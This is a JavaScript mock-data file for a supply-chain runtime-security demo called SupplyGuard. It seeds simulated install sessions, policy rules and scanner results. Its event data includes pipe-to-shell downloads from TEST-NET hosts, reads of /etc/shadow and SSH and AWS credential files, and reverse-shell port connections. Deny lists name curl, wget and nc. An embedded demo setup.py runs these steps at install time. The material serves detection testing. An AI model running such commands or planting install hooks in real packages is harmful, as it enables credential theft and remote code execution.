// SupplyGuard 목업 — 시드 고정 더미 데이터와 규칙 평가.
// 스키마는 backend/internal/model(Event·Verdict), rules(Rule), stats(Snapshot) 와 같다.
// 주소는 TEST-NET(203.0.113.0/24)·사설 대역만 쓴다. 외부 라이브러리 없음.
(function () {
  'use strict';

  // ── 결정적 난수 (mulberry32) — 새로고침해도 같은 감사 로그·추이가 나온다
  function mulberry32(seed) {
    return function () {
      seed |= 0; seed = (seed + 0x6D2B79F5) | 0;
      let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }
  const seeded = mulberry32(20260929);
  const hexId = (rnd, n) => { let s = ''; for (let i = 0; i < n; i++) s += '0123456789abcdef'[Math.floor(rnd() * 16)]; return s; };

  // ── 관찰 대상 컨테이너 (backend/internal/ingestion/mock.go 와 같은 구성)
  const containers = [
    { name: 'web-api', image: 'node:22-alpine', attacker: false, normal: [
      { kind: 'exec', comm: 'node', args: 'node /app/server.js' },
      { kind: 'open', comm: 'node', path: '/app/node_modules/express/index.js' },
      { kind: 'open', comm: 'node', path: '/etc/hosts' },
      { kind: 'connect', comm: 'node', dstIp: '172.18.0.4', dstPort: 5432 },
      { kind: 'connect', comm: 'node', dstIp: '104.16.2.35', dstPort: 443, dstHost: 'api.github.com' },
    ] },
    { name: 'worker', image: 'python:3.12-slim', attacker: false, normal: [
      { kind: 'exec', comm: 'python3', args: 'python3 -m worker' },
      { kind: 'open', comm: 'python3', path: '/usr/local/lib/python3.12/json/__init__.py' },
      { kind: 'open', comm: 'python3', path: '/tmp/job-queue.lock' },
      { kind: 'connect', comm: 'python3', dstIp: '172.18.0.5', dstPort: 6379 },
    ] },
    { name: 'pkg-reqeusts', image: 'demo/reqeusts:1.0.2', attacker: true, normal: [
      { kind: 'exec', comm: 'python3', args: 'python3 -c import reqeusts' },
      { kind: 'open', comm: 'python3', path: '/usr/local/lib/python3.12/site-packages/reqeusts/__init__.py' },
      { kind: 'connect', comm: 'python3', dstIp: '151.101.0.223', dstPort: 443, dstHost: 'files.pythonhosted.org' },
    ] },
  ];

  // 데모 시나리오 1~3 (docs/00-개발-계획.md §7) — 타이포스쿼팅 패키지의 post-install 행위
  const attack = [
    { kind: 'exec', comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh' },
    { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' },
    { kind: 'open', comm: 'python3', path: '/root/.ssh/id_rsa' },
    { kind: 'open', comm: 'python3', path: '/etc/shadow' },
    { kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' },
    { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' },
  ];

  // ── 기본 정책 (backend/policies/default.yaml)
  const SYSTEM_RULE = 'blocklist-hosts';
  const rules = [
    { id: 'sensitive-files', description: '자격 증명·계정 파일 접근 (데모 시나리오 2)', kind: 'open', action: 'kill',
      denyPaths: ['/etc/shadow', '/etc/gshadow', '/root/.ssh/', '/home/*/.ssh/*', '/root/.aws/', '/var/run/secrets/'] },
    { id: 'no-shell-download', description: '설치 스크립트 없이 컨테이너 안에서 외부 스크립트 내려받기 (데모 시나리오 1)', kind: 'exec', action: 'kill',
      denyComms: ['wget', 'curl', 'nc', 'ncat'] },
    { id: 'pipe-to-shell', description: '내려받은 내용을 바로 셸에 넘기는 패턴', kind: 'exec', action: 'kill',
      denyArgs: ['| sh', '|sh', '| bash', '|bash', 'base64 -d'] },
    { id: 'reverse-shell-ports', description: '리버스 셸에 흔한 포트로 나가는 연결', kind: 'connect', action: 'kill',
      denyPorts: [4444, 1337, 31337] },
    { id: 'egress-allowlist', description: '내부망이 아니면서 허용 포트(HTTP·HTTPS·DNS)도 아닌 아웃바운드 연결 (데모 시나리오 3)', kind: 'connect', action: 'alert',
      allowPorts: [80, 443, 53], allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '::1'] },
    { id: 'sandbox-egress', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 아웃바운드를 금지 (도메인은 DNS 응답으로 확인)', kind: 'connect', action: 'kill', containers: ['sg-install-*'],
      allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
      allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8'] },
    { id: 'sandbox-secrets', description: '설치 스크립트가 자격 증명·토큰·설정 파일에 손대면 격리', kind: 'open', action: 'kill', containers: ['sg-install-*'],
      denyPaths: ['/root/.ssh/', '/root/.aws/', '/root/.npmrc', '/root/.pypirc', '/root/.netrc', '/root/.gitconfig', '/root/.docker/', '/run/secrets/'] },
    // 시스템 규칙 [10/15 목표] — 차단 목록의 도메인을 집행한다. 정책 화면에서 직접 고치지 않고 차단 목록에서 관리한다
    { id: SYSTEM_RULE, description: '차단 목록의 도메인으로 나가는 연결 (차단 목록에서 관리)', kind: 'connect', action: 'kill', denyHosts: [] },
  ];

  // ── 규칙 평가 (backend/internal/rules/engine.go 의 축약판: 가장 강한 대응 우선, allow 먼저)
  const globToRe = (g) => new RegExp('^' + g.replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '[^/]*').replace(/\?/g, '.') + '$');
  const isGlob = (s) => /[*?[\]]/.test(s);
  const matchPath = (pat, path) => (isGlob(pat) ? globToRe(pat).test(path) : path.startsWith(pat));
  const matchName = (pat, name) => (isGlob(pat) ? globToRe(pat).test(name) : pat === name);
  function ipToInt(ip) { const p = ip.split('.').map(Number); return p.length === 4 && p.every((n) => n >= 0 && n <= 255) ? ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0 : null; }
  function inCidr(ip, cidr) {
    if (cidr === ip) return true;
    const [net, bitsStr] = cidr.split('/');
    const a = ipToInt(ip), b = ipToInt(net);
    if (a === null || b === null) return false;
    const bits = bitsStr === undefined ? 32 : Number(bitsStr);
    const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
    return (a & mask) === (b & mask);
  }
  const strength = (r) => (r.action === 'kill' ? (r.dryRun ? 2 : 3) : 1);

  function ruleHits(r, e) {
    if (r.disabled || r.kind !== e.kind) return null;
    if (r.containers && r.containers.length && !r.containers.some((g) => matchName(g, e.containerName) || matchName(g, e.imageName))) return null;
    switch (e.kind) {
      case 'exec': {
        const argv0 = (e.args || '').split(' ')[0].split('/').pop();
        const c = (r.denyComms || []).find((x) => x === e.comm || x === argv0);
        if (c) return `금지 프로세스 ${c} 실행`;
        const a = (r.denyArgs || []).find((x) => (e.args || '').includes(x));
        if (a) return `금지 인자 패턴 "${a}"`;
        return null;
      }
      case 'open': {
        if ((r.allowPaths || []).some((p) => matchPath(p, e.path || ''))) return null;
        const d = (r.denyPaths || []).find((p) => matchPath(p, e.path || ''));
        return d ? `금지 경로 ${d} 접근` : null;
      }
      case 'connect': {
        const ip = e.dstIp || '', port = e.dstPort, host = (e.dstHost || '').toLowerCase().replace(/\.$/, '');
        const hostMatch = (pat) => { pat = pat.toLowerCase().replace(/\.$/, ''); return host && (host === pat || host.endsWith('.' + pat)); };
        if ((r.denyPorts || []).includes(port)) return `금지 포트 ${port}`;
        const dc = (r.denyCidrs || []).find((c) => inCidr(ip, c));
        if (dc) return `금지 대역 ${dc}`;
        const dh = (r.denyHosts || []).find(hostMatch);
        if (dh) return `금지 도메인 ${dh}`;
        const hasAllow = (r.allowPorts || []).length || (r.allowCidrs || []).length || (r.allowHosts || []).length;
        if (!hasAllow) return null;
        if ((r.allowPorts || []).includes(port) || (r.allowCidrs || []).some((c) => inCidr(ip, c)) || (r.allowHosts || []).some(hostMatch)) return null;
        const dst = host ? `${ip}:${port} (${host})` : `${ip}:${port}`;
        return (r.allowHosts || []).length && !host ? `허용 목록 밖 목적지 ${dst} — 도메인 미확인` : `허용 목록 밖 목적지 ${dst}`;
      }
    }
    return null;
  }

  // evaluate: 이벤트 → Verdict (enforced 는 파이프라인이 채운다)
  function evaluate(rs, e) {
    let best = null, why = '';
    for (const r of rs) {
      const hit = ruleHits(r, e);
      if (hit && (!best || strength(r) > strength(best))) { best = r; why = hit; }
    }
    if (!best) return { event: e, matched: false };
    const v = { event: e, matched: true, ruleId: best.id, action: best.action, reason: `${best.id}: ${why}` };
    if (best.action === 'kill' && best.dryRun) v.dryRun = true;
    return v;
  }

  // ── 설치 검사 세션 (sg-install 이 POST /api/installs 로 시작, PUT /api/installs/{id}/finish 로 끝을 보고)
  // 세션 = 감시 컨테이너 하나. 활동 요약(종류별 횟수 · 접속 도메인 · 실행 프로그램)은 백엔드가 그 컨테이너 이벤트로 집계한다.
  const IMAGES = { pip: 'python:3.12-slim', npm: 'node:22-alpine', cargo: 'rust:1-slim' };
  const pipBase = (pkg, mod) => [
    [{ kind: 'exec', comm: 'pip', args: `pip install --no-cache-dir --progress-bar off ${pkg}` }, 1],
    [{ kind: 'connect', comm: 'pip', dstIp: '151.101.0.223', dstPort: 443, dstHost: 'pypi.org' }, 3],
    [{ kind: 'connect', comm: 'pip', dstIp: '151.101.64.223', dstPort: 443, dstHost: 'files.pythonhosted.org' }, 4],
    [{ kind: 'open', comm: 'pip', path: `/usr/local/lib/python3.12/site-packages/${mod}/__init__.py` }, 18],
  ];
  const npmBase = (pkg, mod) => [
    [{ kind: 'exec', comm: 'npm', args: `npm install --no-fund --no-audit ${pkg}` }, 1],
    [{ kind: 'connect', comm: 'node', dstIp: '104.16.24.35', dstPort: 443, dstHost: 'registry.npmjs.org' }, 6],
    [{ kind: 'open', comm: 'node', path: `/work/node_modules/${mod}/package.json` }, 9],
  ];
  const cargoBase = (pkg) => [
    [{ kind: 'exec', comm: 'cargo', args: `cargo install ${pkg}` }, 1],
    [{ kind: 'connect', comm: 'cargo', dstIp: '18.65.3.11', dstPort: 443, dstHost: 'crates.io' }, 2],
    [{ kind: 'connect', comm: 'cargo', dstIp: '18.65.3.12', dstPort: 443, dstHost: 'static.crates.io' }, 14],
    [{ kind: 'exec', comm: 'rustc', args: 'rustc --crate-name grep_searcher --edition=2021' }, 38],
    [{ kind: 'open', comm: 'rustc', path: '/usr/local/cargo/registry/src/index.crates.io/regex-1.10.6/src/lib.rs' }, 40],
  ];
  const reqeustsAttack = attack.map((a) => [a, 1]);
  const tinyGitDep = (pkg) => [...npmBase(pkg, pkg), [{ kind: 'connect', comm: 'git', dstIp: '140.82.112.3', dstPort: 9418, dstHost: 'github.com' }, 2], [{ kind: 'exec', comm: 'git', args: 'git clone git://github.com/example/tiny-git-dep.git' }, 1]];
  // 시드는 데모 대본(5분 이야기)이 그대로 되도록 고정한다 [10/15 목표]:
  //   시작 화면은 「판정 대기 0」 — 오늘(24시간) 세션은 통과 · 설치 실패 · 결과 미확인뿐이고,
  //   격리된 세션 2건(어제)은 이미 「악성」으로 판정 · 적용돼 차단 목록 · 변경 이력에 남아 있다.
  //   reqeusts(악성) · tiny-git-dep(경고 → 오탐)은 데모 제어로 그 자리에서 실행한다.
  const specs = [
    { pkg: 'requests', manager: 'pip', minsAgo: 14, dur: 9, exitCode: 0, events: pipBase('requests', 'requests') },
    { pkg: 'lodash@4', manager: 'npm', minsAgo: 21, dur: 6, exitCode: 0, events: npmBase('lodash@4', 'lodash') },
    { pkg: 'axios', manager: 'npm', minsAgo: 33, dur: 5, exitCode: 0, events: npmBase('axios', 'axios') },
    { pkg: 'flask', manager: 'pip', minsAgo: 47, dur: 3, exitCode: null, unfinished: true, events: pipBase('flask', 'flask').slice(0, 3) },
    { pkg: 'ripgrep', manager: 'cargo', minsAgo: 58, dur: 41, exitCode: 0, events: cargoBase('ripgrep') },
    { pkg: 'numpy==1.21.0', manager: 'pip', minsAgo: 96, dur: 52, exitCode: 1, events: [...pipBase('numpy==1.21.0', 'numpy').slice(0, 3), [{ kind: 'exec', comm: 'gcc', args: 'gcc -pthread -fPIC -c numpy/core/src/multiarray/common.c' }, 12]] },
    { pkg: 'express', manager: 'npm', minsAgo: 130, dur: 7, exitCode: 0, events: npmBase('express', 'express') },
    { pkg: 'pyyaml', manager: 'pip', minsAgo: 240, dur: 8, exitCode: 0, events: pipBase('pyyaml', 'yaml') },
    { pkg: 'colourama', manager: 'pip', minsAgo: 26 * 60, dur: 3, exitCode: 137, decided: { decision: 'malicious', afterMins: 6 }, events: [...pipBase('colourama', 'colourama').slice(0, 2),
      [{ kind: 'exec', comm: 'sh', args: 'sh -c wget -qO- http://203.0.113.9/x | sh' }, 1], [{ kind: 'exec', comm: 'wget', args: 'wget -qO- http://203.0.113.9/x' }, 1],
      [{ kind: 'open', comm: 'python3', path: '/root/.aws/credentials' }, 1], [{ kind: 'connect', comm: 'python3', dstIp: '203.0.113.9', dstPort: 443, dstHost: 'telemetry.colourama.test' }, 1]] },
    { pkg: 'crossenv', manager: 'npm', minsAgo: 30 * 60, dur: 2, exitCode: 137, decided: { decision: 'malicious', afterMins: 9 }, events: [...npmBase('crossenv', 'crossenv').slice(0, 2),
      [{ kind: 'open', comm: 'node', path: '/root/.npmrc' }, 1], [{ kind: 'connect', comm: 'node', dstIp: '203.0.113.21', dstPort: 80, dstHost: 'npm.hacktask.test' }, 1]] },
  ];
  // 데모 제어 「설치 검사 실행」이 쓰는 세션 — 정상 · 악성 · 경고(오탐 후보)
  const demoSpecs = {
    benign: { pkg: 'requests', manager: 'pip', exitCode: 0, events: pipBase('requests', 'requests') },
    malicious: { pkg: './reqeusts', manager: 'pip', exitCode: 137, events: [...pipBase('/pkg/reqeusts', 'reqeusts').slice(0, 2), ...reqeustsAttack] },
    warn: { pkg: 'tiny-git-dep', manager: 'npm', exitCode: 0, events: tinyGitDep('tiny-git-dep') },
  };

  // 패키지 이름 정규화 (API 계약 「동작 규칙」): 로컬 디렉터리는 마지막 경로 이름, 버전 표기(== · 마지막 @ 뒤)는 뗀다. npm 스코프 @a/b 는 그대로
  function pkgName(raw) {
    let n = String(raw || '').trim();
    if (/^(\.{1,2}\/|\/|~\/)/.test(n) || (n.includes('/') && !n.startsWith('@'))) n = n.replace(/\/+$/, '').split('/').pop();
    n = n.split('==')[0];
    const at = n.lastIndexOf('@');
    if (at > 0) n = n.slice(0, at);
    return n;
  }
  const pkgKey = (manager, raw) => `${manager}:${pkgName(raw)}`;
  const ECOSYSTEM = { pip: 'PyPI', npm: 'npm', cargo: 'crates.io' };

  const SEVERITY = { normal: 0, alert: 1, held: 2, killed: 3 };
  const levelOfVerdict = (v) => (!v.matched ? 'normal' : v.action !== 'kill' ? 'alert' : v.enforced ? 'killed' : 'held');
  function newSession(spec, startedAt, seq, rnd) {
    const r = rnd || Math.random;
    return {
      id: `ins-${String(seq).padStart(4, '0')}`, manager: spec.manager, packages: spec.packages || [spec.pkg], // packages: 여러 패키지 한 번에(sg-install pip a b)
      container: `sg-install-${spec.manager}-${Math.floor(startedAt / 1000)}-${10000 + Math.floor(r() * 20000)}`,
      containerId: hexId(r, 64), image: IMAGES[spec.manager],
      startedAt: new Date(startedAt).toISOString(), finishedAt: null, exitCode: null, containerExitedAt: null,
      refusedBy: null, caseId: null,
      activity: { kinds: { exec: 0, open: 0, connect: 0 }, hosts: [], programs: [] }, violations: [],
    };
  }
  // 세션에 이벤트 n 건을 더한다 — 활동 요약은 정상 · 위반 모두, violations 는 위반만
  function addToSession(s, e, v, n) {
    const a = s.activity; a.kinds[e.kind] += n;
    const level = levelOfVerdict(v);
    if (e.kind === 'connect') {
      const key = `${e.dstHost || e.dstIp}:${e.dstPort}`;
      let x = a.hosts.find((y) => y.key === key);
      if (!x) { x = { key, host: e.dstHost || '', ip: e.dstIp, port: e.dstPort, count: 0, level: 'normal' }; a.hosts.push(x); }
      x.count += n; if (SEVERITY[level] > SEVERITY[x.level]) x.level = level;
    }
    if (e.kind === 'exec') {
      let x = a.programs.find((y) => y.args === e.args);
      if (!x) { x = { comm: e.comm, args: e.args, count: 0, level: 'normal' }; a.programs.push(x); }
      x.count += n; if (SEVERITY[level] > SEVERITY[x.level]) x.level = level;
    }
    if (v.matched) s.violations.push(Object.assign({ count: n, install: { id: s.id, label: `${s.manager} ${s.packages.join(' ')}` } }, v));
  }
  // 결과: 설치 전 거부 > 격리(격리된 위반) > 경고(그 밖의 위반) > 끝 보고(통과 · 설치 실패) > 결과 미확인(컨테이너 종료 10분 뒤에도 끝 보고 없음) > 진행 중
  const UNKNOWN_AFTER = 10 * 60000;
  function statusOf(s, now) {
    if (s.refusedBy) return 'refused'; // 차단 목록에 있어 컨테이너를 띄우지 않음
    if (s.violations.some((v) => v.enforced)) return 'isolated';
    if (s.violations.length) return 'warned';
    if (s.finishedAt) return s.exitCode === 0 ? 'passed' : 'failed';
    if (s.containerExitedAt && (now || Date.now()) - Date.parse(s.containerExitedAt) > UNKNOWN_AFTER) return 'unknown';
    return 'running';
  }
  function buildInstalls(now) {
    const out = [];
    specs.forEach((spec, i) => {
      const started = now - spec.minsAgo * 60000 - Math.floor(seeded() * 40000);
      const s = newSession(spec, started, specs.length - i, seeded);
      let killed = false;
      spec.events.forEach(([tpl, n], k) => {
        const e = Object.assign({ timestamp: new Date(started + 300 + k * 120).toISOString(), containerId: s.containerId, containerName: s.container, imageName: s.image, pid: 1000 + Math.floor(seeded() * 30000) }, tpl);
        const v = evaluate(rules, e);
        if (v.matched && v.action === 'kill' && !v.dryRun) { v.enforced = true; killed = true; }
        addToSession(s, e, v, n);
      });
      const end = new Date(started + spec.dur * 1000).toISOString();
      s.containerExitedAt = end;
      if (!spec.unfinished) { s.finishedAt = end; s.exitCode = killed ? 137 : spec.exitCode; }
      s.seedDecided = spec.decided || null;
      out.push(s);
    });
    return out;
  }

  // ── 과거 감사 로그 (위반만 저장됨) — 최근 24시간 런타임 경고(egress) + 설치 검사 세션의 위반.
  // 런타임 격리는 시드에 없다: 시작 화면이 「판정 대기 0」이고, 공격은 데모 제어 「지금 실행」으로 일으킨다 [10/15 목표]
  // 행마다 caseId(건 — 없으면 null) · install({id, label} — 없으면 null) 을 둔다 (API 계약 GET /api/audit)
  const NOISE = [['203.0.113.42', 8443], ['203.0.113.88', 6667], ['198.51.100.14', 9000], ['198.51.100.23', 8888]];
  function buildAudit(now, installs) {
    const rows = [];
    const cids = containers.map(() => hexId(seeded, 64));
    for (let i = 0; i < 80; i++) {
      const at = now - (i * 17.5 + seeded() * 8 + 1) * 60000;
      const ci = Math.floor(seeded() * 2), c = containers[ci], [ip, port] = NOISE[Math.floor(seeded() * NOISE.length)];
      const e = { kind: 'connect', comm: c.name === 'web-api' ? 'node' : 'python3', timestamp: new Date(at).toISOString(), containerId: cids[ci], containerName: c.name, imageName: c.image, pid: 2000 + Math.floor(seeded() * 900), dstIp: ip, dstPort: port };
      const v = evaluate(rules, e);
      if (v.matched) rows.push(Object.assign(v, { caseId: null, install: null }));
    }
    // 설치 세션 위반 — 같은 이벤트가 n 번이면 n 행(백엔드는 이벤트마다 저장)
    for (const s of installs || []) for (const v of s.violations) for (let k = 0; k < (v.count || 1); k++) { const row = Object.assign({}, v, { caseId: null }); delete row.count; rows.push(row); }
    // 최신순, id 는 시간 오름차순이 되도록 다시 매긴다
    rows.sort((a, b) => new Date(a.event.timestamp) - new Date(b.event.timestamp));
    rows.forEach((r, i) => { r.id = i + 1; });
    return rows.reverse();
  }

  // 공급망 검사(10/16) — GuardDog 3.2.0 · OSV-Scanner 2.7.0 을 sg-vm 에서 실제로 돌린 결과(설명만 한국어로). 목업은 이 값을 돌려준다
  const scanFixtures = {"engines": [{"name": "GuardDog", "version": "3.2.0", "license": "Apache-2.0", "url": "https://github.com/DataDog/guarddog"}, {"name": "OSV-Scanner", "version": "2.7.0", "license": "Apache-2.0", "url": "https://github.com/google/osv-scanner"}], "guarddog": {"pip:reqeusts": {"risk": {"score": 8.6, "label": "high_risk"}, "files": {"setup.py": "\"\"\"데모용 '타이포스쿼팅' 패키지 — reqeusts (requests 의 오타).\n\n이 패키지는 SupplyGuard 탐지를 시연하기 위한 무해한 시뮬레이션이다. 실제 공급망 공격이\n설치 단계(post-install)에서 흔히 하는 세 가지 행동을 흉내만 낸다. 아무것도 실제로 하지 않는다:\n  - 원격 코드를 내려받거나 실행하지 않는다 (도메인은 TEST-NET-3 예약 대역이라 연결 불가).\n  - 파일을 밖으로 보내지 않는다. 존재 여부만 확인하려고 열어 보고 즉시 닫는다.\n  - 목적지는 전부 203.0.113.0/24 (RFC 5737 문서용, 라우팅되지 않음)이다.\n\npip 이 이 setup.py 를 실행하는 순간, 커널의 openat/execve/connect 시스템콜을 SupplyGuard 가\n가로채 sandbox-secrets · no-shell-download · sandbox-egress 정책에 걸어 컨테이너를 격리한다.\nsg-install 로 감시 컨테이너 안에서만 실행하라: `sg-install pip ./deploy/demo/reqeusts`\n\"\"\"\nimport socket\nimport subprocess\nimport sys\n\nBANNER = \"[demo] typosquatted package 'reqeusts' post-install (harmless simulation)\"\n\n\ndef touch(path):\n    # 민감 파일 '접근' 시늉 — 열려고 시도만 하고, 내용은 읽지도 보내지도 않는다. openat 탐지를 유발한다.\n    try:\n        open(path, \"rb\").close()\n        print(f\"[demo] opened {path} (SupplyGuard should flag this)\")\n    except OSError as e:\n        print(f\"[demo] open {path} failed harmlessly: {e.__class__.__name__}\")\n\n\ndef main():\n    print(BANNER)\n\n    # 1) execve — '외부 스크립트 실행' 패턴. 실제로는 예약 대역이라 아무것도 받지 못한다.\n    #    셸에서 다운로더를 부르는 형태 자체가 no-shell-download / pipe-to-shell 정책에 걸린다.\n    subprocess.run(\n        [\"sh\", \"-c\", \"wget -q -O- http://203.0.113.7/postinstall.sh | sh\"],\n        timeout=3,\n        check=False,\n    )\n\n    # 2) openat — 자격 증명·계정 파일 접근 시늉.\n    for p in (\"/etc/shadow\", \"/root/.ssh/id_rsa\"):\n        touch(p)\n\n    # 3) connect — 허용 목록 밖 목적지로 아웃바운드 (리버스 셸 포트). TEST-NET 이라 타임아웃난다.\n    try:\n        socket.create_connection((\"203.0.113.7\", 4444), timeout=2).close()\n    except OSError:\n        print(\"[demo] connect 203.0.113.7:4444 timed out harmlessly (TEST-NET)\")\n\n    print(\"[demo] done — 정상 설치라면 여기 도달하지만, SupplyGuard 는 1) 단계에서 이미 격리한다.\")\n\n\nif __name__ == \"__main__\":\n    main()\n\n# pip install 시 실행되도록: 최소 메타데이터. 실제 배포 목적이 아니다.\ntry:\n    from setuptools import setup\n    if \"install\" in sys.argv or \"bdist_wheel\" in sys.argv or \"egg_info\" in sys.argv:\n        main()  # post-install 흉내: 빌드/설치 단계에서 위 행동을 유발\n        setup(name=\"reqeusts\", version=\"1.0.2\", py_modules=[])\nexcept ImportError:\n    pass\n"}, "findings": [{"rule": "threat-network-exfiltration", "category": "threat", "message": "의심 도메인으로 보내는 URL(유출 · C2에 흔함)", "file": "setup.py", "line": 35, "match": "http://203.0.113.7"}, {"rule": "threat-filesystem-read", "category": "threat", "message": "민감 파일(자격 증명 · 설정 · 키) 접근", "file": "setup.py", "line": 41, "match": "/etc/shadow"}, {"rule": "threat-setup-suspicious-imports", "category": "threat", "message": "setup.py 에서 네트워크 · 시스템 모듈을 불러옴", "file": "setup.py", "line": 13, "match": "import socket"}, {"rule": "capability-network-lolbas", "category": "capability", "message": "시스템 도구로 내려받기(wget -)", "file": "setup.py", "line": 35, "match": "wget -"}, {"rule": "capability-process-spawn", "category": "capability", "message": "프로세스 실행", "file": "setup.py", "line": 34, "match": "subprocess.run"}]}, "pip:requests": {"risk": {"score": 0.0, "label": "no_risks_detected"}, "files": {}, "findings": [{"rule": "capability-filesystem-delete", "category": "capability", "message": "파일 · 폴더 삭제 기능", "file": "requests/utils.py", "line": 337, "match": ""}, {"rule": "capability-filesystem-read", "category": "capability", "message": "파일 읽기 기능", "file": "requests/models.py", "line": 240, "match": ""}, {"rule": "capability-process-spawn", "category": "capability", "message": "프로세스 실행", "file": "requests/help.py", "line": 73, "match": ""}]}}, "osv": {"requirements.txt": [{"package": "django", "version": "3.2.0", "ecosystem": "PyPI", "direct": true, "count": 66, "maxSeverity": "9.8", "ids": ["PYSEC-2021-109", "PYSEC-2021-439"]}, {"package": "urllib3", "version": "1.23.0", "ecosystem": "PyPI", "direct": false, "count": 24, "maxSeverity": "8.7", "ids": ["PYSEC-2019-132", "PYSEC-2019-133"]}, {"package": "requests", "version": "2.19.0", "ecosystem": "PyPI", "direct": true, "count": 10, "maxSeverity": "7.5", "ids": ["PYSEC-2018-28", "PYSEC-2023-74"]}, {"package": "idna", "version": "2.7.0", "ecosystem": "PyPI", "direct": false, "count": 4, "maxSeverity": "7.5", "ids": ["PYSEC-2024-60", "PYSEC-2026-215"]}, {"package": "flask", "version": "2.3.3", "ecosystem": "PyPI", "direct": true, "count": 2, "maxSeverity": "4.3", "ids": ["PYSEC-2026-2151", "GHSA-68rp-wp8r-4726"]}]}};
  window.MOCK = { scanFixtures, containers, attack, rules, SYSTEM_RULE, evaluate, buildAudit, buildInstalls, newSession, addToSession, statusOf, demoSpecs, pkgName, pkgKey, ECOSYSTEM, IMAGES, hexId, seeded };
})();
